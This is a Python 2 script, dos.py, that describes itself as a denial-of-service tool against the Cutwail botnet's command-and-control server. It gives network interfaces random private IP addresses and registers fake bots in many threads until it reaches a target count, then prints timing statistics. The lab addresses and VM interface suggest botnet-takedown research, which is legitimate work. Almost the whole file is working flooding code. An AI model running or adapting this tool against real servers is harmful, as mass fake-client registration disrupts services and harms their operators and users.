# dos.py

"""
Description:
This program conducts a Denial of Service attack against the botnet C&C server.

Modules:
    bot             : Defines functions to configure C&C server communication
    cipher          : Defines the CBC encryption/decryption functions
    c_types_defines : Defines ctype structures
    termcolor       : For printing out colored text, $pip install termcolor
    subprocess      : For calling external (shell) command from python

WARNING: 
This program needs root permission to call the "ifconfig" shell command.

"""

import sys
import array
import socket
import fcntl
import struct
import time
import os, signal
import random
import optparse
import threading

from bot import init_socket, communicate, generate_package, process_package
from cipher import pencrypt, pdecrypt
from utils import hexdump, get_ip_address
from c_types_defines import *
from termcolor import cprint
from subprocess import call

# Enable/Disable debug mode
DBG         = False
PRINT_CMD   = False

# Bot network interface
#IFACE = "eth0"
IFACE = "vmnet8"
TIMEOUT = 1

# C&C connection IP and Port number
HOST = "10.0.0.128"
PORT = 43242

# C&C commands
RC_SLEEP    = 1
RC_GETWORK  = 2
RC_RESTART  = 3
RC_UPDATE   = 4
RC_BID      = 5
RC_TEMPLATE = 6
RC_CONFIG   = 7
RC_MAILFROM = 8
RC_ACCOUNTS = 9

# Number of bots communicating with the C&C server
BOT_NUM = 0 

# Thread lock
lock = threading.Lock()

# Assign a random class A private IP address to interface
def init_iface(iface):
    rand1 = str(random.randint(0,255))
    rand2 = str(random.randint(0,255))
    rand3 = str(random.randint(0,254))
    ip = "10." + rand1 + "." + rand2 + "." + rand3
    
    try:
        call(["ifconfig", iface, ip])
    except Exception as e:
        # Try again with a different IP
        init_iface(iface)

    return ip

# Add new bot to the botnet
def add_bot(iface):
    global BOT_NUM
    s = init_socket(iface, TIMEOUT)
    communicate(s, dbg=DBG, print_cmd=PRINT_CMD, timeout=TIMEOUT)
    s.close()

    with lock:
        BOT_NUM -= 1 # Bot disconnected

# Bring network interfaces down
def ifconfig_down(iface_count):
    cprint("\n[*] Bringing network interfaces down...", "green")
    for i in range(0, iface_count + 1):
        call(["ifconfig", IFACE + ":" + str(i), "down"])

def print_status(ip, iface):
    cprint("[+] Started new thread (" + str(BOT_NUM) + "): IFACE ", end="")
    cprint(iface, "yellow", end="") 
    cprint(" IP ", end="")
    cprint(ip, "cyan")

def print_statistics(runtime):
    cprint("\n[*] Statistics:", "yellow")
    cprint("Run time: " + str(runtime), "yellow")
    cprint("Number of bots registered: " + str(BOT_NUM), "yellow")
    cprint("Average register speed (bot per second): " + str(BOT_NUM/runtime), "yellow")
    cprint("Average time taken to register one bot (s): " + str(runtime/BOT_NUM), "yellow")

def main():
    global BOT_NUM

    # Options parser
    parser = optparse.OptionParser()
    parser.add_option("-t", action="store", dest="TARGET_NUM", 
                        default=1000, type="int",
                        help="target number of bots")
    parser.add_option("-n", action="store", dest="VM_NUM", 
                        default=1, type="int",
                        help="number of VMs working for DoS attack")
    (opts, args) = parser.parse_args()

    # Calculate the target number of bots for this machine
    TARGET = opts.TARGET_NUM / opts.VM_NUM

    print "Denial of Service attack tool for Cutwail\n"

    # Get the PID of this process and save it to a file
    f = open("pid.txt", "w")
    f.write(str(os.getpid()))
    f.close()

    threads = [] # Maintain a list of threads
    iface_count = 0 # Maintain a count on new newtwork interfaces made
    print_once = True
    start = time.time() # Start timer

    print "[*] Starting DoS attack...\n"

    while True:
        if BOT_NUM > TARGET:
            if print_once:
                # Stop timing
                end = time.time()
                runtime = end - start
                # Print statistics
                print_statistics(runtime)
                print_once = False

            continue

        try:
            # Initialize new network interface
            iface = IFACE + ":" + str(iface_count)
            ip = init_iface(iface)

            # Start a new thread and add new bot to the botnet
            t = threading.Thread(target=add_bot, args=(iface,))
            threads.append(t)
            t.start()

            with lock:
                BOT_NUM += 1

            iface_count += 1

            # Print status
            #print_status(ip, iface)

        except KeyboardInterrupt:
            print "[-] KeyboardInterrupt: executing exit routine..."
            break

        except Exception as e:
            cprint("[-] " + str(e), "red")
            break

    # Bring interfaces down
    ifconfig_down(iface_count)

    """
    # Wait for all threads to terminate
    for thread in threads:
        thread.join()
    """


if __name__ == "__main__":
    main()

